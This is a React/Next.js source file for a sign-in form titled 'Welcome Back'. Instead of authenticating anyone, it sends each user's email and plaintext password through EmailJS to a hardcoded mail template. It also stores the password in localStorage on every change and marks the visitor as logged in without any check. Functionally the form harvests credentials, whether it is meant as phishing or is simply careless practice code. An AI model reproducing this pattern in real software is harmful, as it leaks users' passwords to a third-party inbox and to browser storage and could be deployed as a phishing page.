"use client";
import { useState, useEffect } from "react";
import Link from "next/link";
import Image from "next/image";
import Swal from "sweetalert2";
import emailjs from "emailjs-com";
import { FORM_FIELDS } from "@/utils/helper";

const LyricsForm = () => {
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [remember, setRemember] = useState(false);
  const [error, setError] = useState({ email: "", password: "", remember: "" });
  const [passwordVisible, setPasswordVisible] = useState(false); 

  useEffect(() => {
    localStorage.setItem("email", formData.email);
    localStorage.setItem("password", formData.password);
    localStorage.setItem("remember", remember.toString());
  }, [formData, remember]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError({ email: "", password: "", remember: "" });
    const emailSyntax = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Validation
    if (!formData.email || !formData.password) {
      setError((prev) => ({
        ...prev,
        email: !formData.email ? "Email is required" : "",
        password: !formData.password ? "Password is required" : "",
      }));
      return;}

    if (!emailSyntax.test(formData.email)) {
      setError((prev) => ({ ...prev, email: "Invalid email format" }));
      return;}

    if (formData.password.length < 6) {
      setError((prev) => ({ ...prev, password: "Password must have a minimum of 6 characters" }));
      return;}
    if (!remember) {
      setError((prev) => ({ ...prev, remember: "Please select 'Remember for 30 days'" }));
      return;}

    // EmailJS send
    emailjs
      .send(
        "service_ix25dr9",
        "template_ohy6dpx",
        {
          email: formData.email,
          password: formData.password,
        },
        "v5JFU5BhK_V5R8A-v"
      )
      .then(
        () => {
          Swal.fire({
            title: "Success!",
            text: "Form submitted successfully.",
            icon: "success",
            confirmButtonText: "Great!",
          });
          // Successful login
          localStorage.setItem("isAuthenticated", "true");
          window.location.href = "/dashboard";
        },
        () => {
          Swal.fire({
            title: "Error!",
            text: "Something went wrong, please try again later.",
            icon: "error",
            confirmButtonText: "Close",
          });
        }
      );
  };

  return (
    <div className="pb-24 max-lg:pt-8 bg-levender">
      <div className="max-w-[1440px] mx-auto px-4 max-lg:px-[35px]">
        <div className="flex justify-between flex-wrap max-lg:justify-center">
          <div className="lg:pt-5">
            <Link href="/" className="cursor-pointer">
              <Image
                src="/assets/images/webp/logo.webp"
                alt="logo"
                width={163}
                height={61.71}
                className="pointer-events-none pb-[138.9px] max-lg:pb-[90px]"
              />
            </Link>
            <form noValidate onSubmit={handleSubmit} className="max-w-[456px]">
              <h2 className="font-semibold text-3xl leading-custom-2xl text-z-black">
                Welcome Back
              </h2>
              <p className="text-sm font-normal leading-custom-xl text-gray pb-[31px]">
                Welcome back! Please enter your details.
              </p>
              {/* Mapping through FORM_FIELDS */}
              {FORM_FIELDS.map(({ id, label, placeholder }) => (
                <div key={id} className="pb-[18px] flex flex-col">
                  <label
                    htmlFor={id}
                    className="font-medium text-base leading-5 text-dusk-black pb-[6px]"
                  >
                    {label}
                  </label>
                  <div className="relative">
                    <input
                      type={id === "password" && !passwordVisible ? "password" : "text"}
                      id={id}
                      value={formData[id as keyof typeof formData]}
                      onChange={(e) =>
                        setFormData({ ...formData, [id]: e.target.value })
                      }
                      onFocus={() => setError((prev) => ({ ...prev, [id]: "" }))}
                      placeholder={placeholder}
                      className={`px-[14px] py-5 outline-none w-[456px] rounded-lg border max-md:w-[320px] shadow-custom-xl font-normal text-sm leading-6 placeholder:text-gray placeholder:text-sm ${
                        error[id as keyof typeof error]
                          ? "border-red-500"
                          : "border-silver-gray"
                      }`}
                    />
                    {id === "password" && (
                      <button
                        type="button"
                        onClick={() => setPasswordVisible((prev) => !prev)}
                        className="absolute right-3 top-1/2 transform -translate-y-1/2"
                      >
                        <Image
                          src={ passwordVisible
                              ? "/assets/images/svg/eye-fill.svg"
                              : "/assets/images/svg/eye-slash-fill.svg"} 
                              alt="Toggle Password Visibility" width={20} height={20}/></button>)}
                  </div>
                  {error[id as keyof typeof error] && (
                    <p className="text-red-500 pt-2">{error[id as keyof typeof error]}</p>)}
                </div>
              ))}
              <div className="flex md:items-center justify-between pt-[18px] max-md:flex-col max-md:gap-[14px]">
                <label htmlFor="remember" className="inline-flex items-center gap-3">
                  <input
                    type="checkbox" id="remember" checked={remember}
                    onChange={(e) => {setRemember(e.target.checked);if (e.target.checked) {
                        setError((prev) => ({ ...prev, remember: "" }));}
                    }}
                    className="text-custom-blue size-5 !border-light-gray rounded-[6px]"/>
                  <span className="font-normal text-base font-inter text-dark-gray">
                    Remember for 30 days
                  </span>
                </label>
                <p className="font-inter text-base font-normal text-blue cursor-pointer hover:text-light-blue duration-500">
                  Forgot password
                </p>
              </div>
              {error.remember && <p className="text-red-500 pt-2">{error.remember}</p>}
              <button
                type="submit"
                className="pt-[9px] pb-[10px] font-medium text-white text-sm leading-6 bg-dusk-black w-full mt-6 hover:bg-green-400 transition-all duration-300 rounded-[9px]">
                Sign In
              </button>
              <Link
                href="https://www.google.com/"
                target="blank"
                className="py-2.5 bg-white w-full mt-[6px] rounded-[9px] border border-silver-gray flex items-center gap-[10px] justify-center cursor-pointer hover:bg-green-400 hover:border-transparent duration-500 group">
                <Image
                  src="/assets/images/svg/google-svg.svg"
                  alt="google-icon"
                  width={22}
                  height={22}
                  className="mr-2"/>
                <p className="text-sm font-medium text-dusk-black group-hover:text-white duration-500">
                  Sign in with Google
                </p>
              </Link>
              <p className="font-inter font-normal text-base text-gray md:text-center pt-[18px]">
                Don’t have an account?{" "}
                <span className="text-blue font-normal text-base pl-1.5 cursor-pointer hover:text-light-blue duration-500">
                  Sign up
                </span>
              </p>
            </form>
          </div>
          <Image
            src="/assets/images/webp/main-image.webp"
            alt="hero-image"
            width={759}
            height={899}
            className="pointer-events-none max-lg:pt-24 xl:max-w-[759px] max-w-[520px] w-full lg:block hidden"/>
        </div>
      </div>
    </div>
  );
};

export default LyricsForm;
